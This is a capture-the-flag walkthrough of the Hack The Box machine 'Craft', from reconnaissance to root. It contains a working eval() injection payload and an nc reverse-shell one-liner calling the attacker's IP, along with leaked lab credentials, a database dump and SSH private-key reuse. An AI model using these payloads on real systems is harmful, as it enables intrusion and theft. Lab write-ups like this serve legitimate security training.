# [Craft](https://app.hackthebox.com/machines/craft)

```bash
nmap -p-  --min-rate 10000 10.10.10.110 -Pn 
```

![alt text](img/image.png)

After detection of open ports, let's do greater nmap scan here.

```bash
nmap -A -sC -sV -p22,443,6022 10.10.10.110 -Pn
```

![alt text](img/image-1.png)


While we browse this ip address, we see that HTTP record resolved into `craft.htb`.
Let's add this into `/etc/hosts` file for resolving purposes.


Let's do `Subdomain Enumeration`.

```bash
wfuzz -u "https://10.10.10.110" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt  -H "Host: FUZZ.craft.htb" --hh 3779
```

![alt text](img/image-3.png)


Let's add these records into `/etc/hosts` file, also.



Once I open `api.craft.htb`, I can see `Swagger` Documentation.

![alt text](img/image-2.png)



While we want to authenticate ourselves to `/auth/login` endpoint, we are asked to enter `username` and `password`.



There are two links at the top right that lead to new subdomains: https://api.craft.htb/api/ and https://gogs.craft.htb/


While I open `gogs.craft.htb` which is used for `Code Repository`.

![alt text](img/image-4.png)



While I look at last commits, I can see `hard-coded` credentials.

![alt text](img/image-5.png)


dinesh: 4aUh0A8PbVJxgd


Let's try to authenticate into `API` via this credentials via `curl` request.

```bash
curl -k -X GET "https://dinesh:4aUh0A8PbVJxgd@api.craft.htb/api/auth/login" -H  "accept: application/json"
```

![alt text](img/image-6.png)


We just need this `JWT` token to make requests to other endpoints of `API`.

Again, I enumerate `API` documentation which gets user input which means I can inject something to here.

![alt text](img/image-7.png)

Let's analyze code repository to find anything related to this endpoint.


I find related script and `POST` request method which `eval()` dangerous method is used here.

![alt text](img/image-8.png)


As we see `eval()` method, we can inject some `Python` commands including call `os` library and run system commands which leads to `Code Injection` vulnerability.


So we need to inject malicious command to `abv` parameter which will be used in `eval()` method.

First, we need to get `JWT` token as below and write this output into environment variable.

```bash
export TOKEN=$(curl -s -k -X GET "https://dinesh:4aUh0A8PbVJxgd@api.craft.htb/api/auth/login" -H  "accept: application/json" | cut -d '"' -f4)
```
![alt text](img/image-9.png)

Now, we can send request to send `Code Injection` by using our `JWT` token.

```bash
curl -X POST "https://api.craft.htb/api/brew/" -H  "accept: application/json" -H  "Content-Type: application/json" -d "{
\"id\": 0,
\"brewer\": \"dr4ks\",
\"name\": \"beer\",
\"style\": \"bad\",
\"abv\": \"__import__('os').system('ping -c 10.10.14.2')\"}" -k -H "X-CRAFT-API-TOKEN: $TOKEN"
```

![alt text](img/image-12.png)


I can see results from `tcpdump -i tun0`.

![alt text](img/image-11.png)


Let's change `Command` injection to `reverse shell` payload.

```bash
curl -X POST "https://api.craft.htb/api/brew/" -H  "accept: application/json" -H  "Content-Type: application/json" -d "{
\"id\": 0,
\"brewer\": \"dr4ks\",
\"name\": \"beer\",
\"style\": \"bad\",
\"abv\": \"__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 1337 >/tmp/f')\"}" -k -H "X-CRAFT-API-TOKEN: $TOKEN"
```

![alt text](img/image-10.png)

Hola, I got reverse shell from port `1337`.

![alt text](img/image-13.png)


Let's make interactive shell.
```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
Ctrl+Z
stty raw -echo;fg
export TERM=xterm
export SHELL=bash
```

![alt text](img/image-16.png)

Most probably that's `container`, anyway, we need to make enumeration to find interesting stuff.


From `/opt/app/craft_api` directory, I find `settings.py` file which contain sensitive credentials.

![alt text](img/image-14.png)


craft: qLGockJ6G2J75O

Then I find `dbtest.py` script on `/opt/app` directory, let's read this.

![alt text](img/image-15.png)


This is just used to get informaiton from `brew` table.

Let's modify this script to get full execution of `mysql` database.
```bash
import sys
sql = sys.argv[1]
result = cursor.fetchall()
```

![alt text](img/image-17.png)


Let's execute this script.

```bash
python dbtest.py  'SELECT user()'
```

![alt text](img/image-18.png)


I find table `user` which contains sensitive credentials.
```bash
python dbtest.py  'SELECT * FROM user;'
```

![alt text](img/image-19.png)


Let's look at grabbed credentials.
```bash
dinesh: 4aUh0A8PbVJxgd
ebachman: llJ77D8QFkLPQB
gilfoyle: ZEU3N8WNM2rh4T
```


I check this credentials in so many places, but it `gilfoyle` creds worked for `Gogs` which is `Code Repository`.


![alt text](img/image-20.png)


I find `private repository` called `craft-infra`, let's access here.

Here, I find private key file (id_rsa).

![alt text](img/image-21.png)


Let's take this and change privileges to login into machine.
```bash
chmod 600 id_rsa
ssh -i id_rsa gilfoyle@craft.htb
```

**Note:** Passphrase is the same with password.

user.txt

![alt text](img/image-22.png)


For `Privilege Escalation`, I just look at processes via `ps aux` command and find `vault`.

![alt text](img/image-23.png)

As you see user of `vault` process is `root` user.


I looked at [Documentation](https://developer.hashicorp.com/vault/docs/commands) of `Vault`.


Let's start enumeration.

```bash
vault token lookup
```

![alt text](img/image-24.png)


```bash
vault secrets list
```

![alt text](img/image-25.png)


I look at roles as below.
```bash
vault read ssh/roles/root_otp
```

![alt text](img/image-26.png)


Let's try to connect via `vault ssh` cmdlet.
```bash
vault ssh -mode=otp -role=root_otp root@127.0.0.1
```

root.txt

![alt text](img/image-27.png)